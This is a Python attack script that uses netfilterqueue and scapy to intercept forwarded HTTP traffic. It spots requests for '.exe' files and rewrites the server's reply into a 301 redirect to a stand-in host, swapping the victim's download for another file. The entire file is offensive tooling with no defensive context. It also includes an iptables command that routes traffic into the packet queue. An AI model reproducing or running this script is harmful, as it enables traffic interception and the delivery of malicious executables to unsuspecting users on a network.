#!/usr/bin/env python3

import subprocess
import netfilterqueue
import scapy.all as scapy

ack_list = []

def create_queue():
    print(f"[+]Creating queue 0")
    subprocess.call(["iptables","-I","FORWARD","-j","NFQUEUE","--queue-num",0])

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):

        if scapy_packet[scapy.TCP].dport == 80:
            print("[+]HTTP Request")
            if ".exe" in scapy_packet[scapy.Raw].load.decode():
                print("[+]EXE Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
        elif scapy_packet[scapy.TCP].sport == 80:
            print("[+]HTTP Response")
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+]Replacing file")
                scapy_packet[scapy.Raw].load = b"HTTP/1.1 301 Moved Permanently\nLocation: http://example.com\n\n" 
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.TCP].chksum
                scapy_packet = scapy_packet.__class__(bytes(scapy_packet))
                packet.set_payload(bytes(scapy_packet))
    packet.accept()
    

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
